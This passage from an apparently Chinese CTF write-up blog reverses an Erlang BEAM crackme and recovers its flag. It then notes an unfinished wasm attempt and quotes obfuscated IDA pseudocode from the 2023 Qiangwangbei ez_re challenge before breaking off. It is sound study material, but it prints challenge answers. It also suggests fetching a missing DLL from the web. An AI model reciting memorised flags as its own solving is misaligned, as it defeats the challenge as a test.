class="number">46</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">108</span>]&#125;],</span><br><span class="line">    [&#123;function,main,<span class="number">1</span>,<span class="number">2</span>,</span><br><span class="line">         [&#123;label,<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;line,<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;func_info,&#123;atom,genshin&#125;,&#123;atom,main&#125;,<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">2</span>&#125;,</span><br><span class="line">          &#123;test,is_nonempty_list,&#123;f,<span class="number">3</span>&#125;,[&#123;x,<span class="number">0</span>&#125;]&#125;,</span><br><span class="line">          &#123;get_list,&#123;x,<span class="number">0</span>&#125;,&#123;x,<span class="number">1</span>&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;test,is_nil,&#123;f,<span class="number">3</span>&#125;,[&#123;x,<span class="number">0</span>&#125;]&#125;,</span><br><span class="line">          &#123;move,&#123;x,<span class="number">1</span>&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;call_only,<span class="number">1</span>,&#123;genshin,check,<span class="number">1</span>&#125;&#125;,</span><br><span class="line">          &#123;label,<span class="number">3</span>&#125;,</span><br><span class="line">          &#123;move,</span><br><span class="line">              &#123;literal,<span class="string">&quot;Usage: xxxxxxxx genshin.beam &lt;input_string&gt;~n&quot;</span>&#125;,</span><br><span class="line">              &#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">2</span>&#125;,</span><br><span class="line">          &#123;call_ext_only,<span class="number">1</span>,&#123;extfunc,io,format,<span class="number">1</span>&#125;&#125;]&#125;,</span><br><span class="line">     &#123;function,check,<span class="number">1</span>,<span class="number">5</span>,</span><br><span class="line">         [&#123;line,<span class="number">3</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">4</span>&#125;,</span><br><span class="line">          &#123;func_info,&#123;atom,genshin&#125;,&#123;atom,check&#125;,<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">5</span>&#125;,</span><br><span class="line">          &#123;test,is_list,&#123;f,<span class="number">4</span>&#125;,[&#123;x,<span class="number">0</span>&#125;]&#125;,</span><br><span class="line">          &#123;allocate,<span class="number">1</span>,<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;move,&#123;x,<span class="number">0</span>&#125;,&#123;y,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;move,&#123;literal,[<span class="number">21407</span>,<span class="number">31070</span>,<span class="number">46</span>,<span class="number">46</span>,<span class="number">46</span>,<span class="number">126</span>,<span class="number">110</span>]&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">4</span>&#125;,</span><br><span class="line">          &#123;call_ext,<span class="number">1</span>,&#123;extfunc,io,format,<span class="number">1</span>&#125;&#125;,</span><br><span class="line">          &#123;move,&#123;integer,<span class="number">1</span>&#125;,&#123;x,<span class="number">1</span>&#125;&#125;,</span><br><span class="line">          &#123;move,nil,&#123;x,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">          &#123;move,&#123;y,<span class="number">0</span>&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;init_yregs,&#123;<span class="built_in">list</span>,[&#123;y,<span class="number">0</span>&#125;]&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">5</span>&#125;,</span><br><span class="line">          &#123;call,<span class="number">3</span>,&#123;genshin,transform,<span class="number">3</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">6</span>&#125;,</span><br><span class="line">          &#123;call_ext,<span class="number">1</span>,&#123;extfunc,erlang,list_to_binary,<span class="number">1</span>&#125;&#125;,</span><br><span class="line">          &#123;test,is_eq_exact,</span><br><span class="line">              &#123;f,<span class="number">6</span>&#125;,</span><br><span class="line">              [&#123;tr,&#123;x,<span class="number">0</span>&#125;,&#123;t_bitstring,<span class="number">8</span>,<span class="literal">false</span>&#125;&#125;,</span><br><span class="line">               &#123;literal,</span><br><span class="line">                   &lt;&lt;<span class="number">107</span>,<span class="number">114</span>,<span class="number">102</span>,<span class="number">103</span>,<span class="number">130</span>,<span class="number">68</span>,<span class="number">118</span>,<span class="number">106</span>,<span class="number">107</span>,<span class="number">119</span>,<span class="number">88</span>,<span class="number">109</span>,<span class="number">131</span>,<span class="number">70</span>,</span><br><span class="line">                     <span class="number">114</span>,<span class="number">130</span>,<span class="number">122</span>,<span class="number">81</span>,<span class="number">111</span>,<span class="number">40</span>,<span class="number">107</span>,<span class="number">77</span>,<span class="number">76</span>,<span class="number">38</span>,<span class="number">52</span>,<span class="number">73</span>,<span class="number">72</span>,<span class="number">101</span>&gt;&gt;&#125;]&#125;,</span><br><span class="line">          &#123;move,&#123;literal,[<span class="number">21551</span>,<span class="number">21160</span>,<span class="number">65281</span>,<span class="number">126</span>,<span class="number">110</span>]&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">7</span>&#125;,</span><br><span class="line">          &#123;call_ext_last,<span class="number">1</span>,&#123;extfunc,io,format,<span class="number">1</span>&#125;,<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">6</span>&#125;,</span><br><span class="line">          &#123;move,&#123;literal,[<span class="number">20851</span>,<span class="number">38381</span>,<span class="number">126</span>,<span class="number">110</span>]&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">8</span>&#125;,</span><br><span class="line">          &#123;call_ext_last,<span class="number">1</span>,&#123;extfunc,io,format,<span class="number">1</span>&#125;,<span class="number">1</span>&#125;]&#125;,</span><br><span class="line">     &#123;function,transform,<span class="number">3</span>,<span class="number">8</span>,</span><br><span class="line">         [&#123;line,<span class="number">9</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">7</span>&#125;,</span><br><span class="line">          &#123;func_info,&#123;atom,genshin&#125;,&#123;atom,transform&#125;,<span class="number">3</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">8</span>&#125;,</span><br><span class="line">          &#123;test,is_nonempty_list,&#123;f,<span class="number">9</span>&#125;,[&#123;x,<span class="number">0</span>&#125;]&#125;,</span><br><span class="line">          &#123;get_list,&#123;x,<span class="number">0</span>&#125;,&#123;x,<span class="number">3</span>&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">10</span>&#125;,</span><br><span class="line">          &#123;gc_bif,<span class="string">&#x27;bxor&#x27;</span>,</span><br><span class="line">              &#123;f,<span class="number">0</span>&#125;,</span><br><span class="line">              <span class="number">4</span>,</span><br><span class="line">              [&#123;x,<span class="number">3</span>&#125;,&#123;tr,&#123;x,<span class="number">1</span>&#125;,&#123;t_integer,&#123;<span class="number">1</span>,<span class="string">&#x27;+inf&#x27;</span>&#125;&#125;&#125;],</span><br><span class="line">              &#123;x,<span class="number">3</span>&#125;&#125;,</span><br><span class="line">          &#123;gc_bif,<span class="string">&#x27;+&#x27;</span>,&#123;f,<span class="number">0</span>&#125;,<span class="number">4</span>,[&#123;tr,&#123;x,<span class="number">3</span>&#125;,&#123;t_integer,any&#125;&#125;,&#123;integer,<span class="number">4</span>&#125;],&#123;x,<span class="number">3</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">11</span>&#125;,</span><br><span class="line">          &#123;gc_bif,<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">              &#123;f,<span class="number">0</span>&#125;,</span><br><span class="line">              <span class="number">4</span>,</span><br><span class="line">              [&#123;tr,&#123;x,<span class="number">1</span>&#125;,&#123;t_integer,&#123;<span class="number">1</span>,<span class="string">&#x27;+inf&#x27;</span>&#125;&#125;&#125;,&#123;integer,<span class="number">1</span>&#125;],</span><br><span class="line">              &#123;x,<span class="number">1</span>&#125;&#125;,</span><br><span class="line">          &#123;test_heap,<span class="number">2</span>,<span class="number">4</span>&#125;,</span><br><span class="line">          &#123;put_list,&#123;x,<span class="number">3</span>&#125;,&#123;x,<span class="number">2</span>&#125;,&#123;x,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">          &#123;call_only,<span class="number">3</span>,&#123;genshin,transform,<span class="number">3</span>&#125;&#125;,</span><br><span class="line">          &#123;label,<span class="number">9</span>&#125;,</span><br><span class="line">          &#123;test,is_nil,&#123;f,<span class="number">7</span>&#125;,[&#123;x,<span class="number">0</span>&#125;]&#125;,</span><br><span class="line">          &#123;move,&#123;x,<span class="number">2</span>&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">9</span>&#125;,</span><br><span class="line">          &#123;call_ext_only,<span class="number">1</span>,&#123;extfunc,lists,reverse,<span class="number">1</span>&#125;&#125;]&#125;,</span><br><span class="line">     &#123;function,module_info,<span class="number">0</span>,<span class="number">11</span>,</span><br><span class="line">         [&#123;line,<span class="number">0</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">10</span>&#125;,</span><br><span class="line">          &#123;func_info,&#123;atom,genshin&#125;,&#123;atom,module_info&#125;,<span class="number">0</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">11</span>&#125;,</span><br><span class="line">          &#123;move,&#123;atom,genshin&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;call_ext_only,<span class="number">1</span>,&#123;extfunc,erlang,get_module_info,<span class="number">1</span>&#125;&#125;]&#125;,</span><br><span class="line">     &#123;function,module_info,<span class="number">1</span>,<span class="number">13</span>,</span><br><span class="line">         [&#123;line,<span class="number">0</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">12</span>&#125;,</span><br><span class="line">          &#123;func_info,&#123;atom,genshin&#125;,&#123;atom,module_info&#125;,<span class="number">1</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">13</span>&#125;,</span><br><span class="line">          &#123;move,&#123;x,<span class="number">0</span>&#125;,&#123;x,<span class="number">1</span>&#125;&#125;,</span><br><span class="line">          &#123;move,&#123;atom,genshin&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;call_ext_only,<span class="number">2</span>,&#123;extfunc,erlang,get_module_info,<span class="number">2</span>&#125;&#125;]&#125;]&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>慢慢分析字节码吧…</p><p>这里是最后的check is_eq_exact</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;test,is_eq_exact,</span><br><span class="line">              &#123;f,<span class="number">6</span>&#125;,</span><br><span class="line">              [&#123;tr,&#123;x,<span class="number">0</span>&#125;,&#123;t_bitstring,<span class="number">8</span>,<span class="literal">false</span>&#125;&#125;,</span><br><span class="line">               &#123;literal,</span><br><span class="line">                   &lt;&lt;<span class="number">107</span>,<span class="number">114</span>,<span class="number">102</span>,<span class="number">103</span>,<span class="number">130</span>,<span class="number">68</span>,<span class="number">118</span>,<span class="number">106</span>,<span class="number">107</span>,<span class="number">119</span>,<span class="number">88</span>,<span class="number">109</span>,<span class="number">131</span>,<span class="number">70</span>,</span><br><span class="line">                     <span class="number">114</span>,<span class="number">130</span>,<span class="number">122</span>,<span class="number">81</span>,<span class="number">111</span>,<span class="number">40</span>,<span class="number">107</span>,<span class="number">77</span>,<span class="number">76</span>,<span class="number">38</span>,<span class="number">52</span>,<span class="number">73</span>,<span class="number">72</span>,<span class="number">101</span>&gt;&gt;&#125;]&#125;,</span><br></pre></td></tr></table></figure><p>接着往前找到transform函数<br>在网上搜了搜beam字节码 找到一些例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;gc_bif,<span class="built_in">abs</span>,&#123;f,<span class="number">0</span>&#125;,<span class="number">2</span>,[&#123;x,<span class="number">0</span>&#125;],&#123;x,<span class="number">0</span>&#125;&#125;. <span class="comment">//用x0去调用bif函数abs，存储结果到x0寄存器，</span></span><br><span class="line"></span><br><span class="line">&#123;gc_bif,<span class="built_in">abs</span>,&#123;f,<span class="number">0</span>&#125;,<span class="number">2</span>,[&#123;x,<span class="number">1</span>&#125;],&#123;x,<span class="number">1</span>&#125;&#125;. <span class="comment">//用x1去调用bif函数abs，存储结果到x1寄存器，</span></span><br><span class="line"></span><br><span class="line">&#123;gc_bif,<span class="string">&#x27;+&#x27;</span>,&#123;f,<span class="number">0</span>&#125;,<span class="number">2</span>,[&#123;x,<span class="number">0</span>&#125;,&#123;x,<span class="number">1</span>&#125;],&#123;x,<span class="number">0</span>&#125;&#125;. <span class="comment">//执行bif函数+， x0+x1，结果放入x0寄存器</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有了这些例子再看transform</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;function,transform,<span class="number">3</span>,<span class="number">8</span>,</span><br><span class="line">         [&#123;line,<span class="number">9</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">7</span>&#125;,</span><br><span class="line">          &#123;func_info,&#123;atom,genshin&#125;,&#123;atom,transform&#125;,<span class="number">3</span>&#125;,</span><br><span class="line">          &#123;label,<span class="number">8</span>&#125;,</span><br><span class="line">          &#123;test,is_nonempty_list,&#123;f,<span class="number">9</span>&#125;,[&#123;x,<span class="number">0</span>&#125;]&#125;,</span><br><span class="line">          &#123;get_list,&#123;x,<span class="number">0</span>&#125;,&#123;x,<span class="number">3</span>&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">10</span>&#125;,</span><br><span class="line">          &#123;gc_bif,<span class="string">&#x27;bxor&#x27;</span>,</span><br><span class="line">              &#123;f,<span class="number">0</span>&#125;,</span><br><span class="line">              <span class="number">4</span>,</span><br><span class="line">              [&#123;x,<span class="number">3</span>&#125;,&#123;tr,&#123;x,<span class="number">1</span>&#125;,&#123;t_integer,&#123;<span class="number">1</span>,<span class="string">&#x27;+inf&#x27;</span>&#125;&#125;&#125;],</span><br><span class="line">              &#123;x,<span class="number">3</span>&#125;&#125;,</span><br><span class="line">          &#123;gc_bif,<span class="string">&#x27;+&#x27;</span>,&#123;f,<span class="number">0</span>&#125;,<span class="number">4</span>,[&#123;tr,&#123;x,<span class="number">3</span>&#125;,&#123;t_integer,any&#125;&#125;,&#123;integer,<span class="number">4</span>&#125;],&#123;x,<span class="number">3</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">11</span>&#125;,</span><br><span class="line">          &#123;gc_bif,<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">              &#123;f,<span class="number">0</span>&#125;,</span><br><span class="line">              <span class="number">4</span>,</span><br><span class="line">              [&#123;tr,&#123;x,<span class="number">1</span>&#125;,&#123;t_integer,&#123;<span class="number">1</span>,<span class="string">&#x27;+inf&#x27;</span>&#125;&#125;&#125;,&#123;integer,<span class="number">1</span>&#125;],</span><br><span class="line">              &#123;x,<span class="number">1</span>&#125;&#125;,</span><br><span class="line">          &#123;test_heap,<span class="number">2</span>,<span class="number">4</span>&#125;,</span><br><span class="line">          &#123;put_list,&#123;x,<span class="number">3</span>&#125;,&#123;x,<span class="number">2</span>&#125;,&#123;x,<span class="number">2</span>&#125;&#125;,</span><br><span class="line">          &#123;call_only,<span class="number">3</span>,&#123;genshin,transform,<span class="number">3</span>&#125;&#125;,</span><br><span class="line">          &#123;label,<span class="number">9</span>&#125;,</span><br><span class="line">          &#123;test,is_nil,&#123;f,<span class="number">7</span>&#125;,[&#123;x,<span class="number">0</span>&#125;]&#125;,</span><br><span class="line">          &#123;move,&#123;x,<span class="number">2</span>&#125;,&#123;x,<span class="number">0</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">9</span>&#125;,</span><br><span class="line">          &#123;call_ext_only,<span class="number">1</span>,&#123;extfunc,lists,reverse,<span class="number">1</span>&#125;&#125;]&#125;,</span><br></pre></td></tr></table></figure><p>重点在这一部分:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;line,<span class="number">10</span>&#125;,</span><br><span class="line">          &#123;gc_bif,<span class="string">&#x27;bxor&#x27;</span>,</span><br><span class="line">              &#123;f,<span class="number">0</span>&#125;,</span><br><span class="line">              <span class="number">4</span>,</span><br><span class="line">              [&#123;x,<span class="number">3</span>&#125;,&#123;tr,&#123;x,<span class="number">1</span>&#125;,&#123;t_integer,&#123;<span class="number">1</span>,<span class="string">&#x27;+inf&#x27;</span>&#125;&#125;&#125;],</span><br><span class="line">              &#123;x,<span class="number">3</span>&#125;&#125;,</span><br><span class="line">          &#123;gc_bif,<span class="string">&#x27;+&#x27;</span>,&#123;f,<span class="number">0</span>&#125;,<span class="number">4</span>,[&#123;tr,&#123;x,<span class="number">3</span>&#125;,&#123;t_integer,any&#125;&#125;,&#123;integer,<span class="number">4</span>&#125;],&#123;x,<span class="number">3</span>&#125;&#125;,</span><br><span class="line">          &#123;line,<span class="number">11</span>&#125;,</span><br><span class="line">          &#123;gc_bif,<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">              &#123;f,<span class="number">0</span>&#125;,</span><br><span class="line">              <span class="number">4</span>,</span><br><span class="line">              [&#123;tr,&#123;x,<span class="number">1</span>&#125;,&#123;t_integer,&#123;<span class="number">1</span>,<span class="string">&#x27;+inf&#x27;</span>&#125;&#125;&#125;,&#123;integer,<span class="number">1</span>&#125;],</span><br><span class="line">              &#123;x,<span class="number">1</span>&#125;&#125;,</span><br></pre></td></tr></table></figure><p>bxor这里:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;gc_bif,<span class="string">&#x27;bxor&#x27;</span>,</span><br><span class="line">    &#123;f,<span class="number">0</span>&#125;,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    [&#123;x,<span class="number">3</span>&#125;,&#123;tr,&#123;x,<span class="number">1</span>&#125;,&#123;t_integer,&#123;<span class="number">1</span>,<span class="string">&#x27;+inf&#x27;</span>&#125;&#125;&#125;],</span><br><span class="line">    &#123;x,<span class="number">3</span>&#125;&#125;,</span><br></pre></td></tr></table></figure><p>大致是 {x,1} xor (t_integer+1)  然后结果存给 {x,3}</p><p>再看下面的’+’: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;gc_bif,<span class="string">&#x27;+&#x27;</span>,&#123;f,<span class="number">0</span>&#125;,<span class="number">4</span>,[&#123;tr,&#123;x,<span class="number">3</span>&#125;,&#123;t_integer,any&#125;&#125;,&#123;integer,<span class="number">4</span>&#125;],&#123;x,<span class="number">3</span>&#125;&#125;,</span><br></pre></td></tr></table></figure><p>这里是 {x,3}+4这种运算 最后结果存回 {x,3}<br>再下面的’+’应该是循环的ecx++</p><p>所以加密逻辑:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag[i] = (flag[i]^(i+<span class="number">1</span>))+<span class="number">4</span></span><br></pre></td></tr></table></figure><p>从enc[]逆回去即可得到flag<br>flag: <strong>flag{Funny_erLang_x0r__:)__}</strong></p><hr><hr><p>这种搜索资料的能力和通过例子学习新知识的能力也要多培养 练习<br>不得不感慨赛时做出了的3位佬tql orz</p><h2 id="easy-js2"><a href="#easy-js2" class="headerlink" title="easy_js2"></a>easy_js2</h2><p>wasm文件逆向<br>这种类型确实也见过好多次了<br>Edge查看源代码把output.wasm dump下来<br>跟着<a href="https://xz.aliyun.com/t/5170" target="_blank">这篇</a>操作<br>直接用 .&#x2F;wasm2c wasm.wasm -o wasm.c 反编译得到c代码<br>这里容易出现缺失libcrypto-1_1-x64.dll 网上下一个贴到这个文件夹下就行了(<del>吸取经验教训 别乱往C:&#x2F;&#x2F;system32里加dll…</del>)<br>但这里一直出现 0000004: error: bad magic value ….<br>还是先挂着吧 以后再来看</p><h1 id="2023强网杯"><a href="#2023强网杯" class="headerlink" title="2023强网杯"></a>2023强网杯</h1><p>赛时跟着学校队伍打了打 就做了道re签到…</p><h2 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h2><p>赛时看了看 一大堆while 当时以为考察的是类似opcode的vm<br>…<br>IDA打开 看main 完全没头绪 除了一个假flag check和一大堆while似乎找不到其他有用的点<br>好在函数很少 一个个点开看</p><p>sub_1260:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1260</span><span class="params">(__int64 a1, _QWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  *a2 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">1605141220</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v4 == <span class="number">-1641808572</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *a2 ^= (<span class="type">unsigned</span> __int64)*(<span class="type">unsigned</span> __int8 *)(a1 + v5) &lt;&lt; (<span class="number">24</span> - <span class="number">8</span> * (<span class="type">unsigned</span> __int8)v5);</span><br><span class="line">      v4 = <span class="number">-27338749</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">-285296236</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">-27338749</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v5;</span><br><span class="line">      v4 = <span class="number">1605141220</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">-285296236</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &lt; <span class="number">4</span> )</span><br><span class="line">        v2 = <span class="number">-1641808572</span>;</span><br><span class="line">      v4 = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又是用来混淆的v4… 其实核心就 <code>*a2 ^= xxx&lt;&lt;(24/16/8/0)</code><br>也就是将char-&gt;int之类的</p><p>sub_13A0:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_13A0</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  __int64 *v7; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+1Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+24h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+2Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  <span class="type">bool</span> v21; <span class="comment">// [rsp+46h] [rbp-2Ah]</span></span><br><span class="line">  <span class="type">bool</span> v22; <span class="comment">// [rsp+47h] [rbp-29h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *v23; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *v24; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 *v25; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v26; <span class="comment">// [rsp+60h] 